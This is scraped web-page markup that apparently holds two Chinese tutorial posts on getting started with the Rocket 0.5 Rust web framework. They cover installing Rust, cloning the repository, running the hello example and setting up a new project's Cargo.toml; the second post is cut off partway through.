content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rocket 0.5 快速上手从克隆仓库到跑起第一个示例
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2601910535729322/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HelloReader
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:42:39.000Z" title="Wed Dec 10 2025 02:42:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、环境准备：先装好 Rust 工具链</h2>
<p>在写 Rocket 应用之前，第一步是安装 Rust。Rocket 官方推荐使用 <strong>rustup</strong> 来管理 Rust 版本。</p>
<h3 data-id="heading-1">1.1 为什么推荐 rustup？</h3>
<ul>
<li>支持多通道：<code>stable</code> / <code>beta</code> / <code>nightly</code> 可以随时切换</li>
<li>可以按目录覆盖版本：某个项目用 nightly，其他项目仍然用 stable</li>
<li>更新、卸载都很方便，基本“一条命令搞定”</li>
</ul>
<p>如果你还没安装 Rust，可以直接访问 rustup 官网（rustup.rs），按页面提示执行安装命令。安装完成后，在终端验证：</p>
<pre><code class="hljs language-bash" lang="bash">rustc --version
cargo --version
</code></pre>
<p>两个命令都输出版本号，就说明环境没问题。</p>
<blockquote>
<p>补充：Rocket 0.5 已经支持 <strong>Rust stable</strong>，但在 nightly 上的编译错误提示更友好。一个常见实践是：</p>
<ul>
<li>本地开发：nightly（体验更好）</li>
<li>线上构建：stable（更稳定）</li>
</ul>
</blockquote>
<h2 data-id="heading-2">二、最快体验方式：克隆 Rocket 仓库并运行示例</h2>
<p>Quickstart 推荐的第一条路径不是“新建项目”，而是：</p>
<blockquote>
<p><strong>克隆 Rocket 源码仓库，直接跑 examples 里的代码。</strong></p>
</blockquote>
<p>好处很明显：</p>
<ul>
<li>所有所需依赖已经配置好</li>
<li>示例覆盖常见场景，直接运行即可感受</li>
<li>遇到问题时可以顺带看看源码实现</li>
</ul>
<h3 data-id="heading-3">2.1 克隆 Rocket 仓库</h3>
<p>在终端执行：</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/rwf2/Rocket
<span class="hljs-built_in">cd</span> Rocket
</code></pre>
<p>然后切换到 0.5 版本的 tag（和文档保持一致）：</p>
<pre><code class="hljs language-bash" lang="bash">git checkout v0.5
</code></pre>
<p>这样可以避免 master 分支上可能存在的“未来改动”导致文档与代码不匹配。</p>
<h3 data-id="heading-4">2.2 运行 hello 示例</h3>
<p>所有示例都放在 <code>examples/</code> 目录下，先从最基础的 <code>hello</code> 开始：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> examples/hello
cargo run
</code></pre>
<p>如果构建成功，你会在终端看到类似输出：</p>
<pre><code class="hljs language-text" lang="text">🚀 Rocket has launched from http://127.0.0.1:8000
</code></pre>
<p>用浏览器打开：</p>
<pre><code class="hljs language-text" lang="text">http://127.0.0.1:8000
</code></pre>
<p>就可以看到你的第一个 Rocket 页面了。</p>
<h3 data-id="heading-5">2.3 更多示例：不是只有 Hello World</h3>
<p><code>examples/</code> 下的每一个子目录基本都是一个独立小 Demo，比如：</p>
<ul>
<li><code>examples/json</code>：演示 JSON API</li>
<li><code>examples/forms</code>：演示表单处理</li>
<li><code>examples/static_files</code>：演示静态文件服务</li>
<li><code>examples/chat</code>：演示实时聊天（结合异步流）</li>
<li>……</li>
</ul>
<p>进入任意一个示例目录，执行：</p>
<pre><code class="hljs language-bash" lang="bash">cargo run
</code></pre>
<p>就能体验对应功能，非常适合作为“学习入口 + 代码参考”。</p>
<h2 data-id="heading-6">三、为什么示例能直接跑？Cargo.toml 做了什么？</h2>
<p><strong>示例工程的 Cargo.toml 并不是从 crates.io 下载 Rocket，而是直接引用你刚刚克隆下来的本地 Rocket 源码。</strong></p>
<p>典型写法会类似这样（示意）：</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { path = <span class="hljs-string">"../../core/lib"</span>, features = [<span class="hljs-string">"json"</span>] }
</code></pre>
<p>这样做有几个好处：</p>
<ul>
<li>对 Rocket 作者来说：改动框架源码后，直接在 examples 里验证是否一切正常</li>
<li>对你来说：clone 完整仓库后，无需配置依赖就能跑全套示例</li>
<li>对调试来说：可以顺手点进 Rocket 源码里看具体实现</li>
</ul>
<p>但是，当你把这些示例代码<strong>复制到自己项目里用</strong>时，就要注意了：</p>
<blockquote>
<p><strong>你不应该继续使用 path 依赖，而是应该改为正常的版本依赖。</strong></p>
</blockquote>
<h2 data-id="heading-7">四、基于示例创建自己的 Rocket 项目</h2>
<p>通常我们会这样操作：</p>
<ol>
<li>先在 <code>examples</code> 下找到一个功能接近需求的示例</li>
<li>确认它能正常跑</li>
<li>然后新建一个自己的项目，把示例的核心代码复制过去，再调整依赖和结构</li>
</ol>
<p>下面是一个比较推荐的流程。</p>
<h3 data-id="heading-8">4.1 新建一个自己的项目</h3>
<p>比如我们想创建一个叫 <code>my-rocket-app</code> 的项目：</p>
<pre><code class="hljs language-bash" lang="bash">cargo new my-rocket-app --bin
<span class="hljs-built_in">cd</span> my-rocket-app
</code></pre>
<p>结构大概是：</p>
<pre><code class="hljs language-text" lang="text">my-rocket-app
├── Cargo.toml
└── src
    └── main.rs
</code></pre>
<h3 data-id="heading-9">4.2 修改 Cargo.toml：从本地 path 改为版本依赖</h3>
<p>示例工程用的是本地 path 依赖，而你自己的项目应该像普通 Rust 项目那样写：</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[package]</span>
<span class="hljs-attr">name</span> = <span class="hljs-string">"my-rocket-app"</span>
<span class="hljs-attr">version</span> = <span class="hljs-string">"0.1.0"</span>
<span class="hljs-attr">edition</span> = <span class="hljs-string">"2021"</span>

<span class="hljs-section">[dependencies]</span>
<span class="hljs-attr">rocket</span> = { version = <span class="hljs-string">"0.5.1"</span>, features = [<span class="hljs-string">"json"</span>, <span class="hljs-string">"secrets"</span>] }
<span class="hljs-comment"># 需要模板的话：</span>
<span class="hljs-comment"># rocket_dyn_templates = { version = "0.2.0", features = ["tera"] }</span>
</code></pre>
<p>这里注意两点：</p>
<ol>
<li>
<p><code>rocket</code> 直接指定 <code>0.5.x</code> 版本，而不是 <code>path = ...</code></p>
</li>
<li>
<p><code>features</code> 根据你的实际需求启用，例如：</p>
<ul>
<li><code>json</code>：启用 JSON 支持</li>
<li><code>secrets</code>：启用私有 Cookie（0.5 中默认是 off-by-default）</li>
</ul>
</li>
</ol>
<h3 data-id="heading-10">4.3 复制示例代码，调整成自己的 main.rs</h3>
<p>选一个你喜欢的示例（例如 <code>examples/hello</code>），打开 <code>src/main.rs</code>，你会看到类似代码（简化版）：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rocket;

<span class="hljs-meta">#[get(<span class="hljs-string">"/"</span>)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>() <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">'static</span> <span class="hljs-type">str</span> {
    <span class="hljs-string">"Hello, world!"</span>
}

<span class="hljs-meta">#[launch]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">rocket</span>() <span class="hljs-punctuation">-&gt;</span> _ {
    rocket::<span class="hljs-title function_ invoke__">build</span>()
        .<span class="hljs-title function_ invoke__">mount</span>(<span class="hljs-string">"/"</span>, routes![index])
}
</code></pre>
<p>可以直接复制到你自己项目的 <code>src/main.rs</code>，然后改一改返回内容、路由路径等等：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[macro_use]</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">crate</span> rocket;

<span class="hljs-meta">#[get(<span class="hljs-string">"/"</span>)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">index</span>() <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-symbol">'static</span> <span class="hljs-type">str</span> {
    <span class="hljs-string">"Hello, my own Rocket app!"</span>
}

<span class="hljs-meta">#[launch]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">rocket</span>() <span class="hljs-punctuation">-&gt;</span> _ {
    rocket::<span class="hljs-title function_ invoke__">build</span>()
        .<span class="hljs-title function_ invoke__">mount</span>(<span class="hljs-string">"/"</span>, routes![index])
}
</code></pre>
<p>然后在你自己的项目目录下运行：</p>
<pre><code class="hljs language-bash" lang="bash">cargo run
</code></pre>
<p>如果可以正常启动并访问，就说明你已经基于示例工程，搭好了属于自己的 Rocket 0.5 项目骨架。</p>
<h2 data-id="heading-11">五、Quickstart 背后的思路：先“跑起来”，再“搞明白”</h2>
<p>Quickstart 推荐的路线非常符合一个简单原则：</p>
<blockquote>
<p><strong>先跑起来，再搞明白。</strong></p>
</blockquote>
<p>具体来说，它帮你解决了三个常见阻碍：</p>
<ol>
<li><strong>环境恐惧症</strong>：不知道 Rust 怎么装？→ rustup 一条命令搞定</li>
<li><strong>框架上手恐惧症</strong>：不知道 Rocket 入口在哪？→ 直接跑 examples</li>
<li><strong>工程搭建恐惧症</strong>：不知道 Cargo.toml 怎么写？→ 先看示例，再复制到自己项目里改</li>
</ol>
<p>对刚上手 Rocket 的同学，比较推荐这样一条学习路径：</p>
<ol>
<li>跑 <code>examples/hello</code> → 确认环境无问题</li>
<li>跑 <code>examples/json</code> / <code>examples/forms</code> → 熟悉基本功能</li>
<li>新建自己的项目，把示例代码迁移过去 → 形成自己的起步工程</li>
<li>之后再去看文档中更完整的章节：路由、请求守卫、响应器、配置、数据库、模板等</li>
</ol>
<h2 data-id="heading-12">六、结语</h2>
<p>Rocket 的 Quickstart 给出的其实不是“理论教学”，而是一条<strong>非常务实的实践路径</strong>：</p>
<ul>
<li>用最少的步骤，快速体验到框架的真实开发感受；</li>
<li>再借助 examples 作为“可运行的文档”，一点点把思想搞明白。</li>
</ul>
<p>如果你已经完成了：</p>
<ul>
<li>Rust 环境安装</li>
<li>Rocket 仓库克隆</li>
<li><code>examples/hello</code> 能正常跑</li>
<li>基于示例创建了自己的 <code>my-rocket-app</code></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rocket 0.5 快速上手3 分钟跑起第一个 Rust Web 服务]]></title>    <link>https://juejin.cn/post/7581888578507980827</link>    <guid>https://juejin.cn/post/7581888578507980827</guid>    <pubDate>2025-12-10T02:41:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507980827" data-draft-id="7581727073581989939" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rocket 0.5 快速上手3 分钟跑起第一个 Rust Web 服务"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-10T02:41:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HelloReader"/> <meta itemprop="url" content="https://juejin.cn/user/2601910535729322"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rocket 0.5 快速上手3 分钟跑起第一个 Rust Web 服务
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2601910535729322/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HelloReader
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:41:17.000Z" title="Wed Dec 10 2025 02:41:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、前置条件：先把 Rust 环境装好</h2>
<p>Rocket 是一个 Rust Web 框架，所以第一步当然是：<strong>安装 Rust 工具链</strong>。</p>
<p>官方推荐使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Frustup.rs%2F" target="_blank" title="https://rustup.rs/" ref="nofollow noopener noreferrer"><code>rustup</code></a> 管理 Rust 版本，它的优势是：</p>
<ul>
<li>支持 stable / beta / nightly 多通道切换</li>
<li>可以按项目目录覆盖版本（对 Rocket 很实用）</li>
<li>升级、卸载都很简单</li>
</ul>
<p>如果你还没装 Rust，可以简单理解流程：</p>
<ol>
<li>
<p>打开 rustup 官网，按提示执行安装命令；</p>
</li>
<li>
<p>安装完成后，在终端里执行：</p>
<pre><code class="hljs language-bash" lang="bash">rustc --version
cargo --version
</code></pre>
<p>如果两个命令都能正常输出版本号，说明环境 OK。</p>
</li>
</ol>
<blockquote>
<p>如果你完全没接触过 Rust，建议先稍微看几眼《The Rust Programming Language》（俗称 Rust Book），再用 Rocket 会更顺畅。</p>
</blockquote>
<h2 data-id="heading-1">二、最快体验 Rocket：直接跑官方例子</h2>
<p>Rocket 提供了一套非常完善的 <strong>examples 示例工程</strong>，几乎覆盖了常见场景：
比如 Hello World、JSON API、文件服务、表单、WebSocket 等。</p>
<p>最简单的上手方式是：<strong>把整个 Rocket 仓库拉下来，然后进 examples 跑 demo</strong>。</p>
<h3 data-id="heading-2">2.1 克隆 Rocket 仓库</h3>
<p>在终端执行：</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/rwf2/Rocket
<span class="hljs-built_in">cd</span> Rocket
</code></pre>
<p>接着切到 0.5 版本的 tag（保证文档与代码一致）：</p>
<pre><code class="hljs language-bash" lang="bash">git checkout v0.5
</code></pre>
<blockquote>
<p>为什么建议切到 v0.5 ？
因为你现在看的文档、升级指南都是基于 0.5 的，如果直接在 <code>master</code> 上，可能会遇到还没稳定的新改动，和文档不匹配。</p>
</blockquote>
<h3 data-id="heading-3">2.2 运行 hello 示例</h3>
<p>Rocket 的示例都放在 <code>examples/</code> 目录下，先从最经典的 <code>hello</code> 开始：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> examples/hello
cargo run
</code></pre>
<p>如果一切顺利，你会看到类似输出（省略部分）：</p>
<pre><code class="hljs language-text" lang="text">🚀 Rocket has launched from http://127.0.0.1:8000
</code></pre>
<p>这时候浏览器打开 <code>http://127.0.0.1:8000</code>，就能看到第一个 Rocket Web 服务的响应了。</p>
<blockquote>
<p><strong>小技巧：</strong>
所有 examples 目录下的示例，都可以通过 <code>cargo run</code> 启动：</p>
<ul>
<li><code>examples/json</code></li>
<li><code>examples/forms</code></li>
<li><code>examples/chat</code>（实时聊天）</li>
<li><code>examples/websocket</code>（如果有的话，取决于你当前 tag）
可以按需一个个玩过去，感受一下 Rocket 0.5 的能力边界。</li>
</ul>
</blockquote>
<h3 data-id="heading-4">2.3 为什么官方推荐“先跑 examples”</h3>
<p>原因很简单：<strong>门槛最低、反馈最快</strong>：</p>
<ul>
<li>不用自己写 <code>Cargo.toml</code>、不需要纠结依赖版本；</li>
<li>不需要一开始就理解 Rocket 的所有概念；</li>
<li>先跑起来，再逐步从 “能跑” → “能改” → “能写自己的”。</li>
</ul>
<p>而且 examples 里的 <code>Cargo.toml</code> 已经帮你配置好了：</p>
<ul>
<li>依赖指向本地 <code>rocket</code> 源码（path dependency）；</li>
<li>已经包含了对应示例需要的 feature（比如 json、templates 等）。</li>
</ul>
<p>接下来要做的，就是<strong>把这些示例变成你自己的项目</strong>。</p>
<h2 data-id="heading-5">三、从官方示例“复制”出自己的 Rocket 项目</h2>
<p>当你对某个示例比较满意时，通常有两种做法：</p>
<ol>
<li>在 Rocket 仓库里直接改（不推荐，难以与官方更新解耦）</li>
